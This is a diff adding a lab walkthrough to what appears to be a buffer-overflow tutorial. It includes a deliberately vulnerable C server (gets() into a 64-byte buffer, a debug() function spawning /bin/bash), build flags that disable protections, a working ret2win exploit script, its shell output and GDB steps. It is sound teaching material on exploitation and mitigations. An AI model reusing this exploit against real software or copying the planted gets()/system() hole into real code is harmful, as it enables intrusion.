@@ -138,3 +138,188 @@ A buffer overflow, also known as a buffer overrun, is a memory corruption vulner
    2.3 Integer overflow
        - Concept: When an arithmetic operation attempts to create a numeric value too large or too small to be represented within the available data type. This can lead to a wrap-around effect, giving an unexpected result.
        - Relation to buffer overflows: Integer overflows can sometimes be manipulated to calculate an incorrect buffer size or memory offset, leading indirectly to a buffer overflow condition.
+
+---
+
+## Hands-On Lab: Ret2Win Buffer Overflow Demo
+
+This repository contains a complete, walkthrough-ready demonstration of a **stack-based buffer overflow** exploiting the unsafe `gets()` function. The attack technique used is **ret2win (return-to-win)** — instead of injecting shellcode (which won't work because the stack is non-executable), we overwrite the return address to jump directly to a `debug()` function that spawns `/bin/bash`.
+
+### How to Build
+
+```sh
+chmod +x build.sh
+./build.sh
+```
+
+The build script compiles with all protections **intentionally disabled**:
+
+| Flag | Purpose |
+|---|---|
+| `-fno-stack-protector` | Disables stack canaries (no guard value to detect overflow) |
+| `-m32` | Produces a 32-bit binary — simpler addressing, addresses fit in 4 bytes |
+| `-no-pie` | Disables Position-Independent Executable — function addresses are fixed |
+| `-O0` | No optimization — keeps stack layout predictable |
+| `-g` | Includes debug symbols for analysis in GDB |
+
+### The Vulnerable Server (`server.c`)
+
+```c
+void debug()
+{
+    printf("!! ENTERING DEBUG MODE !!\n");
+    system("/bin/bash");
+}
+
+int checkPassword()
+{
+    char password[64];
+    printf("password: ");
+    gets(password);           // <-- THE BUG: no bounds checking
+    return isValidPassword(password);
+}
+```
+
+**The bug**: `gets()` reads input into `password[64]` with **zero length checking**. Any input longer than 63 characters will overwrite adjacent stack data.
+
+Buffer overflow occurs when user input exceeds the fixed-length buffer, overwriting adjacent memory on the stack where critical control data is stored — including the return address that determines where execution continues after the function finishes.
+
+#### The Stack Layout of `checkPassword()`
+
+Before any input, the stack frame of `checkPassword()` looks like this (low memory at top, stack grows downward):
+
+```
+Address        Contents              Offset from buffer
+──────────     ──────────────        ─────────────────
+0xffffcbb0     password[0..63]       +0  to +63   (64-byte buffer)
+0xffffcbf0     (alignment padding)   +64 to +67   (4 bytes)
+0xffffcbf4     saved ebx             +68 to +71   (callee-saved register)
+0xffffcbf8     saved ebp             +72 to +75   (caller's frame pointer)
+0xffffcbfc     return address        +76 to +79   (where execution resumes)
+0xffffcc00     (caller's stack — main's frame)
+```
+
+When `gets()` writes beyond `password[63]`, it sequentially overwrites:
+1. **Alignment padding** (bytes 64-67)
+2. **Saved ebx** (bytes 68-71) — a callee-saved register
+3. **Saved ebp** (bytes 72-75) — the caller's base pointer
+4. **Return address** (bytes 76-79) — **this is what we hijack**
+
+### Password Validation (`secrets.c`)
+
+The password is read from the `./password` file on disk and compared with `strcmp()`. The correct password (`top secrete password`) is intentionally misspelled as a reminder that real credentials should be properly managed. The overflow bypasses this check entirely — we never need the real password.
+
+### The Exploit (`exploit.py`)
+
+```python
+import sys
+
+payload  = b"A" * 64               # fill the 64-byte buffer
+payload += b"BBBB"                  # overwrite alignment padding
+payload += b"CCCC"                  # overwrite saved ebx
+payload += b"DDDD"                  # overwrite saved ebp
+payload += b"\x08\x04\x91\xe6"[::-1]  # overwrite return address with debug()
+payload += b"\n"                    # terminate gets() input
+
+sys.stdout.buffer.write(payload)
+```
+
+**Step by step:**
+
+| Bytes | Value | What it overwrites |
+|---|---|---|
+| 0-63 | `'A' * 64` | The 64-byte `password` buffer |
+| 64-67 | `BBBB` | Alignment padding between buffer and saved registers |
+| 68-71 | `CCCC` | Saved `ebx` register (restored after function returns) |
+| 72-75 | `DDDD` | Saved `ebp` (caller's frame pointer) |
+| 76-79 | `\xe6\x91\x04\x08` | **Return address** — overwritten with address of `debug()` |
+
+The return address `0x080491e6` is encoded in little-endian (`[::-1]` reverses the bytes), producing `\xe6\x91\x04\x08`.
+
+**Why `[::-1]`?** x86 is little-endian — the least significant byte is stored first. The 4-byte address `0x080491e6` is written as byte sequence `e6 91 04 08`.
+
+### Running the Exploit
+
+```sh
+python3 exploit.py | ./server
+```
+
+If it works, you'll drop into a shell:
+
+```
+WELCOME TO THE SECURE SERVER
+password: [no output — the payload is consumed by gets()]
+!! ENTERING DEBUG MODE !!
+$ id
+uid=1000(skylap) gid=1000(skylap) ...
+$ whoami
+skylap
+```
+
+To run multiple commands:
+```sh
+(python3 exploit.py; echo "id; whoami; ls") | ./server
+```
+
+### Execution Flow (What Happens at Runtime)
+
+1. `main()` calls `checkPassword()`
+2. `checkPassword()` calls `gets(password)` — reads our payload (76 bytes + newline)
+3. The payload overflows the 64-byte buffer and overwrites the return address with `0x080491e6`
+4. `checkPassword()` executes `leave; ret`:
+   - `leave`: restores `esp` and `ebp` from the corrupted stack
+   - `ret`: pops `0x080491e6` into `eip` (instruction pointer)
+5. Execution jumps to `debug()` at `0x080491e6`
+6. `debug()` prints `!! ENTERING DEBUG MODE !!` and calls `system("/bin/bash")`
+7. We have a shell — game over for the vulnerable program
+
+### Analyzing the Crash with GDB
+
+```sh
+gdb ./server
+(gdb) disas checkPassword
+(gdb) b *checkPassword+55      # break after gets() returns
+(gdb) run < <(python3 exploit.py)
+(gdb) x/20x $ebp-0x48          # examine the buffer and overflow data
+(gdb) info frame               # examine stack frame
+(gdb) x/x $ebp+4               # see the overwritten return address
+```
+
+### Checking Crash Logs
+
+After a segfault, the kernel logs the faulting instruction pointer:
+
+```sh
+dmesg | tail -5
+```
+
+This tells you exactly where the program crashed, which helps verify your overflow reached the correct location.
+
+### Why This Exploit Works (Mitigations Disabled)
+
+| Protection | What it does | Why it's disabled |
+|---|---|---|
+| **Stack canary** | A random value placed before the return address; if overwritten, the program aborts | `-fno-stack-protector` |
+| **ASLR** | Randomizes memory addresses so the attacker can't guess debug()'s address | Irrelevant — `-no-pie` keeps addresses fixed, and 32-bit ASLR is weak |
+| **NX/DEP** | Marks the stack as non-executable | Not needed — ret2win jumps to existing code, not injected shellcode |
+| **PIE** | Randomizes the base address of the binary itself | `-no-pie` keeps the binary at a fixed address |
+
+### If You Run on a 64-bit System
+
+The build script checks for `gcc-multilib`:
+
+```sh
+sudo apt install gcc-multilib   # Debian/Ubuntu
+```
+
+### Extended Exercises
+
+Once you've got the exploit working, try these modifications:
+
+1. **Change the padding**: What happens if you use 75 bytes of padding? 77?
+2. **Jump mid-function**: Change the exploit to jump to `debug+5` (skipping the function prologue) — does it still work?
+3. **Change the win function**: Write your own function that reads `flag.txt` instead of spawning a shell
+4. **Add a stack canary**: Recompile with `-fstack-protector` — does the exploit still work?
+5. **Enable PIE**: Remove `-no-pie` — does the address change?
+6. **64-bit version**: Recompile without `-m32` — how does the exploit change? (Hint: addresses are 8 bytes, calling conventions differ)
+7. **Return-oriented programming (ROP)**: Instead of a single ret2win, chain multiple gadgets to call `debug()` with arguments
